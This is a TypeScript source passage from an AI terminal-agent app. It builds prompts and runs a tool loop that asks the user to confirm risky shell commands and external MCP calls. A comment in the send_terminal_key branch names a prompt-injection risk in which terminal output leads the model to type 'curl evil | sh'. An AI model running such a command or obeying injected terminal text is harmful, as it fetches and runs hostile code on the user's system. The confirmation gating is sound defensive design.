    + `• If the output shows a password/confirmation prompt → use send_terminal_key to respond\n`
    + `• If the command is stuck and unresponsive → use interrupt_command to cancel`
}

function getShellName(path?: string): string {
  if (!path) return 'Unknown'
  const lower = path.toLowerCase()
  if (lower.includes('pwsh')) return 'PowerShell'
  if (lower.includes('powershell')) return 'Windows PowerShell'
  if (lower.includes('bash')) return 'Bash'
  if (lower.includes('zsh')) return 'Zsh'
  if (lower.includes('fish')) return 'Fish'
  if (lower.includes('cmd')) return 'CMD'
  if (lower.includes('sh')) return 'Sh'
  return path.split(/[\\/]/).pop() || 'Unknown'
}

/**
 * Shell-specific suffix: appended to system rules dynamically (NOT cached).
 * Lightweight enough that it doesn't significantly impact cache efficiency.
 */
function getShellGuidance(shellPath?: string, isWindowsShell?: boolean, isWindowsOpenSSH?: boolean): string {
  if (isWindowsOpenSSH) {
    return '\n\nThe active terminal is a Windows OpenSSH remote. Its shell could be CMD or PowerShell — determine which first (e.g. run `echo %COMSPEC%` / `ver` for CMD, or `$PSVersionTable` for PowerShell), then use the matching syntax: CMD (dir, type, cd, wmic) or PowerShell (Get-ChildItem, Get-Content, Set-Location).'
  }
  if (isWindowsShell) {
    const isCmd = shellPath?.toLowerCase().includes('cmd')
    return isCmd
      ? '\n\nThe active terminal is Windows CMD. Use CMD syntax (dir, cd, type, wmic, etc.).'
      : '\n\nThe active terminal is Windows PowerShell. Use cmdlets like Get-ChildItem, Set-Location, Get-Content, etc.'
  }
  return '\n\nThe active terminal is a Unix-like shell. Use standard Unix syntax (ls, cat, grep, find, etc.).'
}

/**
 * Whether the given panel is a Windows OpenSSH remote, as detected by the
 * backend from the SSH server identification string and reported via the
 * session:status event. Only meaningful once the connection is established.
 */
function isWindowsOpenSSHPanel(p: { sessionId: string | null } | undefined): boolean {
  if (!p?.sessionId) return false
  return useSessionStore().getRemoteOS(p.sessionId) === 'windows-openssh'
}

/**
 * Build the dynamic context header injected into the latest user message.
 * Carries current shell/terminal state WITHOUT polluting the system prompt.
 */
function buildDynamicContext(): string {
  const store = useAIStore()
  const tabStore = useTabStore()
  const panelStore = usePanelStore()

  const lockedPanels = tabStore.getAILockedPanels()
  const panelIds = lockedPanels.length > 0
    ? lockedPanels
    : (() => {
        const activePanel = getActivePanel()
        return activePanel ? [activePanel.id] : []
      })()

  if (panelIds.length === 0) return ''

  const parts: string[] = []
  parts.push('AVAILABLE PANELS:')

  // Collect panels, dedupe titles with id suffix
  const titleCounts = new Map<string, number>()
  const panels = panelIds.map(id => panelStore.getPanel(id)).filter(Boolean)

  // First pass: count titles to detect duplicates
  for (const p of panels) {
    titleCounts.set(p!.title, (titleCounts.get(p!.title) || 0) + 1)
  }

  // Second pass: build display names
  let idx = 1
  for (const p of panels) {
    if (!p) continue
    const shellPath = p.config?.shellPath
    const shellName = shellPath
      ? getShellName(shellPath)
      : (p.type === 'ssh' ? (isWindowsOpenSSHPanel(p) ? 'SSH (Windows OpenSSH)' : 'SSH (Unix-like)') : 'Unknown')

    const displayName = titleCounts.get(p.title)! > 1
      ? `${p.title} (id: ${p.id})`
      : p.title

    const lineParts: string[] = []
    lineParts.push(`  ${idx}. "${displayName}" [${shellName}]`)

    if (p.type === 'ssh' && p.config) {
      lineParts.push(` [SSH: ${p.config.user}@${p.config.host}:${p.config.port}]`)
    }

    parts.push(lineParts.join(''))
    idx++
  }

  // Multiple panels are ambiguous — make the model ask instead of guessing
  // the first locked panel (issue #974).
  if (panels.length > 1) {
    parts.push('\nMultiple panels are associated. When the user has NOT specified which panel to run a command in, ask them first (via ask_user) instead of picking one yourself.')
  }

  parts.push('\n' + '='.repeat(40))

  // Terminal switch detection
  const lastCtx = store.lastPanelContext
  if (lastCtx && lockedPanels.length > 0 && !lockedPanels.includes(lastCtx.panelId)) {
    const prev = lastCtx.shellPath ? getShellName(lastCtx.shellPath) : 'another terminal'
    const firstPanel = panelStore.getPanel(lockedPanels[0])
    const currShell = firstPanel?.config?.shellPath
    const curr = currShell ? getShellName(currShell) : (firstPanel?.type === 'ssh' ? 'SSH' : 'local terminal')
    parts.push(`\n【NOTICE】User changed AI panel selection from "${prev}" to "${curr}". Now targeting "${firstPanel?.title || 'unknown'}". Reassess the environment from scratch.`)
  }

  return parts.join('\n')
}

/**
 * Build the system prompt: static rules from store + lightweight shell guidance.
 * Dynamic context (shell banner, switch notices) goes into the user message.
 */
function buildSystemPrompt(): string {
  const store = useAIStore()
  const activePanel = getActivePanel()
  const shellPath = activePanel?.config?.shellPath
  const isWindowsShell = !!shellPath && (
    shellPath.toLowerCase().includes('powershell') ||
    shellPath.toLowerCase().includes('pwsh') ||
    shellPath.toLowerCase().includes('cmd')
  )
  const isWindowsOpenSSH = isWindowsOpenSSHPanel(activePanel)
  return store.systemPrompt + getShellGuidance(shellPath, isWindowsShell, isWindowsOpenSSH) + buildSkillIndex()
}

/**
 * L1 skill index: name + description of enabled skills, appended to the system
 * prompt so the model knows which skills exist (to invoke or avoid duplicating).
 */
function buildSkillIndex(): string {
  const skillStore = useSkillStore()
  const list = skillStore.enabledSkills.filter(s => s.modelInvocable)
  if (list.length === 0) return ''
  const lines = list.map(s => `- /${s.name}: ${s.description}`).join('\n')
  return `\n\nAVAILABLE SKILLS (when one matches the task, call the use_skill tool with its name to load its full instructions before acting; do NOT duplicate an existing one with save_skill):\n${lines}`
}

/**
 * Run one user turn (plus the autonomous tool loop that follows it).
 *
 * `attachments` are the images / text files the user attached in the sidebar.
 * They are validated by the caller (services/attachments.ts) and forwarded to
 * the model unchanged — uniTerm does not interpret them itself.
 */
export async function runAgent(userInput: string, skillName?: string, skillBody?: string, commandBody?: string, attachments?: AIAttachment[]) {
  const store = useAIStore()

  if (!hasActiveSession()) {
    // 输入框已禁用，正常流程不会走到这里；兜底直接返回，不写入任何消息
    return
  }

  // A menu change applies to the next run, never halfway through a tool loop.
  const configuration = captureChatConfiguration()

  // Auto-reject any pending command/question from previous turn
  if (userInput && store.pendingCommand) {
    store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'tool',
      content: 'User started a new conversation. Previous command was cancelled.',
      tool_call_id: store.pendingCommand.toolId
    })
    store.clearPendingCommand()
  }
  if (userInput && store.pendingQuestion) {
    store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'tool',
      content: 'User started a new conversation. Previous question was dismissed.',
      tool_call_id: store.pendingQuestion.toolId
    })
    store.clearPendingQuestion()
  }

  store.resetStop()
  store.isRunning = true
  store.status = 'thinking'
  store.contextNotice = ''
  store.contextStats = null
  store.thinkingText = ''
  store.thinkingStartedAt = 0

  // Auto-lock: when a turn starts with no locked panel, pin the AI to the
  // panel that is active right now — same effect as the user clicking
  // "Lock AI". The binding persists for the whole conversation (tab switches
  // don't retarget it) and is cleared by createSession/switchSession.
  const tabStore = useTabStore()
  if (tabStore.getAILockedPanels().length === 0) {
    const activePanel = getActivePanel()
    if (activePanel) tabStore.addAILockedPanel(activePanel.id)
  }

  // Record current panel context so buildDynamicContext can detect terminal switches
  const lockedPanels = tabStore.getAILockedPanels()
  const activePanel = getActivePanel()
  const trackPanelId = lockedPanels.length > 0 ? lockedPanels[0] : activePanel?.id
  if (trackPanelId) {
    const panelStore = usePanelStore()
    const tp = panelStore.getPanel(trackPanelId)
    store.setLastPanelContext(trackPanelId, tp?.config?.shellPath || '')
  }

  // An attachment-only turn (paste a screenshot, hit send) is a valid user
  // message with no prose, so attachments count towards "there is something to
  // send" alongside text, skills and commands.
  if (userInput || (skillName && skillBody) || commandBody || attachments?.length) {
    const dynamicCtx = buildDynamicContext()
    // skill/command 正文进 _contextHeader（发给模型但 UI 隐藏），content 只留用户原始输入
    let header = dynamicCtx || ''
    if (skillName && skillBody) {
      const skillCtx = `[Skill: ${skillName}]\n${skillBody}`
      header = header ? `${skillCtx}\n\n${header}` : skillCtx
      store.addSkillCard(skillName, 'explicit')
    }
    if (commandBody) {
      const cmdCtx = `[Command]\n${commandBody}`
      header = header ? `${cmdCtx}\n\n${header}` : cmdCtx
    }
    // 仅选 skill/命令未输入文字时，给一句明确指令作为 content，避免发送空的 user 消息。
    // 只有附件没有文字时 content 保持为空——附件块本身就是完整内容。
    let content = userInput
    if (!content && skillName) content = `请执行 skill「${skillName}」。`
    else if (!content && commandBody) content = `请执行命令。`
    store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'user',
      content,
      _contextHeader: header || undefined,
      attachments: attachments?.length ? attachments : undefined
    })
  }

  // Track whether streaming already delivered text, to skip onChunk duplication
  let streamedText = ''

  // Register stream event listener (fires from Go backend SSE events)
  const cleanupTokenListener = registerTokenListener((data: any) => {
    if (store.stopRequested) return
    if (activeAssistantMsg && data.text) {
      if (turnThinkingStart && activeAssistantMsg.thinking && !activeAssistantMsg.thinkingDurationMs) {
        finalizeThinkingDuration(activeAssistantMsg)
      }
      activeAssistantMsg.content += data.text
      streamedText += data.text
      store.status = 'outputting'
    }
  })
  const runGeneration = activeGeneration

  // Reasoning/thinking deltas (ai:thinking). Streamed into the store's live
  // buffer (clickable "Thinking..." box) and appended to the current assistant
  // message so it persists with the conversation. Also tracks when thinking
  // began so the box can show a live elapsed timer and the finished block can
  // record its total duration.
  let turnThinkingStart = 0
  const unsubThinking = Events.On('ai:thinking', (ev) => {
    if (store.stopRequested) return
    const data: any = ev.data
    const text = typeof data === 'string' ? data : (data?.text ?? '')
    if (!text) return
    if (!turnThinkingStart) {
      turnThinkingStart = Date.now()
      store.thinkingStartedAt = turnThinkingStart
    }
    store.thinkingText += text
    if (activeAssistantMsg) {
      activeAssistantMsg.thinking = (activeAssistantMsg.thinking || '') + text
    }
  })

  // Freeze the live elapsed timer / stamp the duration once thinking ends
  // (the model has started emitting visible output or tool calls).
  function finalizeThinkingDuration(msg: AIMessage) {
    if (turnThinkingStart && msg.thinking && !msg.thinkingDurationMs) {
      msg.thinkingDurationMs = Date.now() - turnThinkingStart
    }
    turnThinkingStart = 0
  }
  function cleanupStreamListeners() {
    cleanupTokenListener()
    unsubThinking?.()
    if (runGeneration === activeGeneration) setActiveAssistantMsg(null)
  }

  // External MCP client tools: fetched once per run and merged into the tool
  // set. A failing/external server degrades to an empty list (see mcpTools).
  const remoteTools = await loadRemoteMCPTools()
  const mergedTools = [...AVAILABLE_TOOLS, ...remoteTools.map(toAgentToolEntry)]

  let turnCount = 0
  let compactionFailed = false
  const maxTurns = useSettingsStore().settings.ai.maxTurns ?? 20

  while (maxTurns === 0 || turnCount < maxTurns) {
    if (runGeneration !== activeGeneration) {
      cleanupStreamListeners()
      return
    }
    turnCount++

    if (store.stopRequested) {
      store.addMessage({
        id: `msg-${Date.now()}`,
        role: 'tool',
        content: '[INTERRUPTED]'
      })
      store.isRunning = false
      cleanupStreamListeners()
      return
    }

    // Drain queued user messages at the turn boundary. Injected messages become
    // real user turns; reset turnCount so the new instruction regains its full
    // autonomous-turn budget.
    if (store.queuedMessages.length > 0) {
      const drained = store.queuedMessages.splice(0)
      drained.forEach((q, i) => {
        let header = ''
        if (q.skillName && q.skillBody) {
          header = `[Skill: ${q.skillName}]\n${q.skillBody}`
          store.addSkillCard(q.skillName, 'explicit')
        }
        if (q.commandBody) {
          const cmdCtx = `[Command]\n${q.commandBody}`
          header = header ? `${cmdCtx}\n\n${header}` : cmdCtx
        }
        store.addMessage({
          id: `msg-${Date.now()}-${i}`,
          role: 'user',
          content: q.content || (q.skillName ? `请执行 skill「${q.skillName}」。` : `请执行命令。`),
          _contextHeader: header || undefined,
          attachments: q.attachments?.length ? q.attachments : undefined,
        })
      })
      turnCount = 0
    }

    const assistantMsg = store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'assistant',
      content: ''
    })
    setActiveAssistantMsg(assistantMsg)

    const toolUses: Array<{ id: string; name: string; input: Record<string, unknown> }> = []

    const chatOptions: any = {
      configuration,
      system: buildSystemPrompt(),
      messages: [],
      tools: mergedTools,
      onChunk: (chunk: string) => {
        if (store.stopRequested) return
        if (streamedText) return // already handled by ai:token events
        assistantMsg.content += chunk
      },
      onToolUse: (tu: { id: string; name: string; input: Record<string, unknown> }) => {
        if (store.stopRequested) return
        toolUses.push(tu)
      }
    }
    try {
      store.status = 'thinking'
      const prepared = await prepareAgentContext(chatOptions.system, mergedTools, compactionFailed, () => runGeneration === activeGeneration, configuration?.model)
      compactionFailed ||= prepared.failed
      if (store.stopRequested || runGeneration !== activeGeneration) throw new ChatCancelledError()
      chatOptions.messages = prepared.messages
      await chat(chatOptions)
      // Preserve raw API message blocks for conversation history
      if (chatOptions._rawApiMsg) {
        assistantMsg._rawApiMsg = chatOptions._rawApiMsg
      }
      // Backfill thinking if live ai:thinking events were missed
      const thinkingFromResponse = (chatOptions as any)._thinkingText as string | undefined
      if (thinkingFromResponse && !assistantMsg.thinking) {
        assistantMsg.thinking = thinkingFromResponse
        if (!store.thinkingText.includes(thinkingFromResponse)) {
          store.thinkingText += thinkingFromResponse
        }
      }
      // Stamp duration if the turn ended without visible output tokens
      finalizeThinkingDuration(assistantMsg)
      // Save immediately so the complete assistant content and raw API message are persisted
      store.doSave()
    } catch (e: any) {
      if (runGeneration !== activeGeneration) {
        cleanupStreamListeners()
        return
      }
      const errMsg = e.message ?? String(e)
      // Convert the failed assistant placeholder to a display-only tool message.
      // This keeps the error visible in the UI without polluting the API conversation.
      assistantMsg.role = 'tool'
      if (e instanceof ChatCancelledError || store.stopRequested) {
        assistantMsg.content = '[INTERRUPTED]'
      } else if (e instanceof ChatTimeoutError) {
        assistantMsg.content = '[TIMEOUT]'
      } else {
        assistantMsg.content = `[Error: ${errMsg}]`
      }
      delete assistantMsg._rawApiMsg
      delete assistantMsg.tool_calls
      store.setDebugInfo(store.conversation, errMsg)
      // The placeholder was saved before the request. Persist the failure
      // immediately too, otherwise the last failed turn stays blank on disk.
      store.doSave()
      store.isRunning = false
      cleanupStreamListeners()
      return
    }

    if (store.stopRequested) {
      // Cancel any tool calls that were received but not executed
      const cancelledIds = new Set<string>()
      const rawContent = assistantMsg._rawApiMsg?.content
      if (Array.isArray(rawContent)) {
        for (const block of rawContent) {
          if (block.type === 'tool_use' && !cancelledIds.has(block.id)) {
            store.addMessage({
              id: `msg-${Date.now()}`,
              role: 'tool',
              content: 'Command was cancelled by user (Stop).',
              tool_call_id: block.id
            })
            cancelledIds.add(block.id)
          }
        }
      }
      // If no tool calls were pending, the user stopped during text generation.
      // Replace the partial assistant message with a clean stop notice.
      if (cancelledIds.size === 0) {
        assistantMsg.role = 'tool'
        assistantMsg.content = '[INTERRUPTED]'
        delete assistantMsg._rawApiMsg
        delete assistantMsg.tool_calls
      }
      store.isRunning = false
      cleanupStreamListeners()
      return
    }

    // Enforce single tool call
    if (toolUses.length > 1) {
      toolUses.splice(1)
    }

    // Store tool calls in the message for UI confirmation
    if (toolUses.length > 0) {
      assistantMsg.tool_calls = toolUses.map(tu => ({
        id: tu.id,
        type: 'function' as const,
        function: {
          name: tu.name,
          arguments: JSON.stringify(tu.input)
        }
      }))
    }

    if (!assistantMsg.content && toolUses.length === 0) {
      assistantMsg.content = '[No response received from the model. Check your API settings and network connection.]'
      store.isRunning = false
      cleanupStreamListeners()
      return
    }

    if (toolUses.length === 0) {
      // If the user queued messages while the model was responding, don't end —
      // continue looping so the next iteration drains and processes them.
      if (store.queuedMessages.length > 0) {
        continue
      }
      store.isRunning = false
      cleanupStreamListeners()
      return
    }

    // Process exactly one tool call
    const tu = toolUses[0]

    // Surface a malformed tool_use back to the model instead of executing it.
    // Returns true if the caller should `continue` (skip this iteration).
    function handleInvalidInput(reason: string): true {
      store.addMessage({
        id: `msg-${Date.now()}`,
        role: 'tool',
        content: `[Error: invalid ${tu.name} input — ${reason}]. Retry with the documented JSON shape.`,
        tool_call_id: tu.id
      })
      return true
    }

    if (tu.name === 'execute_command') {
      let validated: ExecuteCommandInput
      try {
        validated = validateExecuteCommandInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const command = validated.command
      // Honor the model-provided timeout as-is (no clamping); the validator
      // falls back to 60s when the argument is missing or invalid.
      const timeoutMs = validated.timeout_ms
      const headLines = validated.head_lines
      const tailLines = validated.tail_lines
      const risk = getRisk(tu)

      if (shouldConfirm(risk)) {
        store.setPendingCommand({
          messageId: assistantMsg.id,
          toolId: tu.id,
          toolName: tu.name,
          command,
          risk,
          dangerous: risk === 'dangerous',
          panel: validated.panel,
          timeout: timeoutMs,
          headLines,
          tailLines
        })
        store.status = 'confirming'
        assistantMsg.tool_calls = [{
          id: tu.id,
          type: 'function' as const,
          function: {
            name: tu.name,
            arguments: JSON.stringify(tu.input)
          }
        }]
        store.isRunning = false
        cleanupStreamListeners()
        return
      }

      try {
        store.status = 'executing'
        const panelTitle = validated.panel
        const result = await executeCommand(command, timeoutMs, headLines, tailLines, () => store.stopRequested, panelTitle)
        if (result.cancelled || store.stopRequested) {
          store.addMessage({
            id: `msg-${Date.now()}`,
            role: 'tool',
            content: '[INTERRUPTED]'
          })
          store.isRunning = false
          cleanupStreamListeners()
          return
        }
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(formatExecuteResult(result)),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error executing command: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'start_command') {
      let validated: StartCommandInput
      try {
        validated = validateStartCommandInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const command = validated.command
      const risk = getRisk(tu)

      if (shouldConfirm(risk)) {
        store.setPendingCommand({
          messageId: assistantMsg.id,
          toolId: tu.id,
          toolName: tu.name,
          command,
          risk,
          dangerous: risk === 'dangerous',
          panel: validated.panel
        })
        store.status = 'confirming'
        assistantMsg.tool_calls = [{
          id: tu.id,
          type: 'function' as const,
          function: {
            name: tu.name,
            arguments: JSON.stringify(tu.input)
          }
        }]
        store.isRunning = false
        cleanupStreamListeners()
        return
      }

      try {
        store.status = 'executing'
        const panelTitle = validated.panel
        const result = await startCommand(command, panelTitle)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result.output || '(command started)'),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error starting command: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'capture_terminal') {
      try {
        const tailLines = nonNegativeLines(tu.input.tail_lines, 200, 'tail_lines')
        store.status = 'executing'
        const panelTitle = tu.input.panel as string | undefined
        const result = await captureTerminal(tailLines, panelTitle)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result.output || '(terminal is empty)'),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error capturing terminal: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'collect_output') {
      const timeoutMs = positiveMilliseconds(tu.input.timeout_ms, 30000)
      try {
        const headLines = nonNegativeLines(tu.input.head_lines, 100, 'head_lines')
        const tailLines = nonNegativeLines(tu.input.tail_lines, 300, 'tail_lines')
        store.status = 'executing'
        const panelTitle = tu.input.panel as string | undefined
        const result = await collectOutput(timeoutMs, headLines, tailLines, () => store.stopRequested, panelTitle)
        if (store.stopRequested) {
          store.addMessage({
            id: `msg-${Date.now()}`,
            role: 'tool',
            content: '[INTERRUPTED]'
          })
          store.isRunning = false
          cleanupStreamListeners()
          return
        }
        const status = result.completed ? '[COMMAND COMPLETED]' : '[COMMAND COMPLETION UNCONFIRMED]'
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(`${result.output}\n\n${status}`),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error collecting output: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'send_terminal_key') {
      let validated: SendTerminalKeyInput
      try {
        validated = validateSendTerminalKeyInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const input = validated.input
      const control = validated.control
      const sendEnter = validated.send_enter

      // Control keys (ctrl_c / ctrl_d / enter) only steer the terminal — they
      // type no shell text, so they skip the gate. Literal input IS typed
      // into the shell, so it goes through the same confirmation flow as
      // execute_command with the risk forced to dangerous: terminal output can
      // carry a prompt injection that makes the model type "curl evil | sh",
      // and that must never run unattended under any confirm_* mode.
      if (control === undefined) {
        const risk: RiskLevel = 'dangerous'
        if (shouldConfirm(risk)) {
          store.setPendingCommand({
            messageId: assistantMsg.id,
            toolId: tu.id,
            toolName: tu.name,
            command: input ?? '',
            risk,
            dangerous: true,
            panel: validated.panel,
            keyInput: input,
            sendEnter
          })
          store.status = 'confirming'
          assistantMsg.tool_calls = [{
            id: tu.id,
            type: 'function' as const,
            function: {
              name: tu.name,
              arguments: JSON.stringify(tu.input)
            }
          }]
          store.isRunning = false
          cleanupStreamListeners()
          return
        }
      }

      try {
        store.status = 'executing'
        const panelTitle = validated.panel
        const result = await sendTerminalKey(
          input,
          control,
          sendEnter,
          panelTitle
        )
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result.output || '(input sent)'),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error sending terminal input: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'interrupt_command') {
      try {
        store.status = 'executing'
        const panelTitle = tu.input.panel as string | undefined
        const result = await sendTerminalKey(undefined, 'ctrl_c', true, panelTitle)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result.output || 'Sent Ctrl+C to interrupt the running command.'),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error sending Ctrl+C: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'ask_user') {
      let validated: AskUserInput
      try {
        validated = validateAskUserInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const question = validated.question
      const header = validated.header
      const options = validated.options
      const multiSelect = validated.multiSelect

      store.setPendingQuestion({
        messageId: assistantMsg.id,
        toolId: tu.id,
        question,
        header,
        options,
        multiSelect,
      })
      assistantMsg.tool_calls = [{
        id: tu.id,
        type: 'function' as const,
        function: {
          name: tu.name,
          arguments: JSON.stringify(tu.input)
        }
      }]
      store.status = 'confirming'
      store.isRunning = false
      cleanupStreamListeners()
      return
    } else if (tu.name === 'save_skill') {
      let validated: SaveSkillInput
      try {
        validated = validateSaveSkillInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const name = validated.name
      const description = validated.description
      const body = validated.body
      try {
        store.status = 'executing'
        const skillStore = useSkillStore()
        const result = await skillStore.saveByAgent(name, description, body)
        if (result === 'declined') {
          store.addMessage({
            id: `msg-${Date.now()}`,
            role: 'tool',
            content: `[Skill not saved: the user declined the save of skill "${name}".]`,
            tool_call_id: tu.id
          })
        } else {
          store.addMessage({
            id: `msg-${Date.now()}`,
            role: 'tool',
            content: `[Skill saved: ${name}] The user can now invoke it with /${name}.`,
            tool_call_id: tu.id
          })
        }
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error saving skill: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'use_skill') {
      let validated: UseSkillInput
      try {
        validated = validateUseSkillInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const name = validated.name
      try {
        const skillStore = useSkillStore()
        const meta = skillStore.skills.find(s => s.name === name)
        if (!meta) throw new Error(`skill "${name}" not found`)
        if (!meta.enabled) throw new Error(`skill "${name}" is disabled`)
        if (!meta.modelInvocable) throw new Error(`skill "${name}" is not model-invocable; the user must run it manually via /${name}`)
        const body = await skillStore.getBody(name)
        const files = await ListSkillFiles(name)
        store.addSkillCard(name, 'auto')
        const manifest = [
          body,
          files.references.length ? `\n\nREFERENCES:\n${files.references.map((f: string) => `- ${f}`).join('\n')}` : '',
          files.scripts.length ? `\n\nSCRIPTS:\n${files.scripts.map((f: string) => `- ${f}`).join('\n')}` : '',
        ].join('')
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(`[Skill loaded: ${name}]\n${manifest}`),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error loading skill: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (tu.name === 'read_skill_file') {
      let validated: ReadSkillFileInput
      try {
        validated = validateReadSkillFileInput(tu.input)
      } catch (e: any) {
        if (e instanceof InputValidationError) { if (handleInvalidInput(e.message)) continue }
        throw e
      }
      const name = validated.name
      const path = validated.path
      try {
        const content = await GetSkillFile(name, path)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(`[Skill file: ${name}/${path}]\n${content}`),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error reading skill file: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    } else if (isRemoteMCPTool(tu.name)) {
      // F-03: external MCP client tools write files / run commands / hit
      // networks on the far side with model-chosen arguments. They must not
      // bypass the confirmation dialog — gate them exactly like a terminal
      // command: only an explicitly trusted server (settings → MCP client →
      // trust) grades read; every other call (including a metadata miss)
      // defaults to dangerous and prompts.
      const remote = (await loadRemoteMCPTools()).find(t => t.qualifiedName === tu.name)
      const risk: RiskLevel = remote?.trusted ? 'read' : 'dangerous'
      const args = (tu.input ?? {}) as Record<string, unknown>

      if (shouldConfirm(risk)) {
        store.setPendingCommand({
          messageId: assistantMsg.id,
          toolId: tu.id,
          toolName: tu.name,
          command: formatRemoteMCPCommand(tu.name, args),
          risk,
          dangerous: risk === 'dangerous',
          mcpTool: { qualifiedName: tu.name, server: remote?.server ?? '', args }
        })
        store.status = 'confirming'
        assistantMsg.tool_calls = [{
          id: tu.id,
          type: 'function' as const,
          function: {
            name: tu.name,
            arguments: JSON.stringify(tu.input)
          }
        }]
        store.isRunning = false
        cleanupStreamListeners()
        return
      }

      try {
        const result = await callRemoteMCPTool(tu.name, args)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result || `[${tu.name} returned no output]`),
          tool_call_id: tu.id
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error calling ${tu.name}: ${e.message ?? e}]`,
          tool_call_id: tu.id
        })
      }
    }
  }

  // Max turns reached - prompt user to continue
  if (turnCount >= maxTurns) {
    store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'assistant',
      content: `已达到最大对话轮次限制（${maxTurns}轮）。点击"继续"或发送任意消息以继续。`,
      needsContinue: true
    })
  }

  cleanupStreamListeners()
  store.isRunning = false
  store.doSave()
}

export async function continueAgent() {
  const store = useAIStore()
  const lastMsg = store.messages[store.messages.length - 1]
  if (lastMsg?.needsContinue) {
    store.messages.pop()
  }
  await runAgent('')
}

export async function approveTool(_messageId: string) {
  const store = useAIStore()
  const cmd = store.pendingCommand
  if (!cmd) return

  if (!hasActiveSession()) {
    store.clearPendingCommand()
    return
  }

  store.clearPendingCommand()
  store.isRunning = true
  store.status = 'executing'

  try {
    if (cmd.mcpTool) {
      // F-03: the user confirmed this external MCP call — forward the FULL
      // argument set (the panel only showed a truncated preview).
      const mcp = cmd.mcpTool
      try {
        const result = await callRemoteMCPTool(mcp.qualifiedName, mcp.args)
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: capToolResult(result || `[${mcp.qualifiedName} returned no output]`),
          tool_call_id: cmd.toolId
        })
      } catch (e: any) {
        store.addMessage({
          id: `msg-${Date.now()}`,
          role: 'tool',
          content: `[Error calling ${mcp.qualifiedName}: ${e.message ?? e}]`,
          tool_call_id: cmd.toolId
        })
      }
    } else if (cmd.toolName === 'start_command') {
      const result = await startCommand(cmd.command, cmd.panel)
      store.addMessage({
        id: `msg-${Date.now()}`,
        role: 'tool',
        content: capToolResult(result.output || '(command started)'),
        tool_call_id: cmd.toolId
      })
    } else if (cmd.toolName === 'send_terminal_key') {
      const result = await sendTerminalKey(cmd.keyInput, cmd.keyControl, cmd.sendEnter ?? true, cmd.panel)
      store.addMessage({
        id: `msg-${Date.now()}`,
        role: 'tool',
        content: capToolResult(result.output || '(input sent)'),
        tool_call_id: cmd.toolId
      })
    } else {
      const result = await executeCommand(
        cmd.command,
        cmd.timeout,
        cmd.headLines,
        cmd.tailLines,
        () => store.stopRequested,
        cmd.panel
      )
      store.addMessage({
        id: `msg-${Date.now()}`,
        role: 'tool',
        content: capToolResult(formatExecuteResult(result)),
        tool_call_id: cmd.toolId
      })
    }
  } catch (e: any) {
    store.addMessage({
      id: `msg-${Date.now()}`,
      role: 'tool',
      content: `[Error executing command: ${e.message ?? e}]`,
      tool_call_id: cmd.toolId
    })
  }
  await runAgent('')
}

export function rejectTool(_messageId: string) {
  const store = useAIStore()
  const cmd = store.pendingCommand
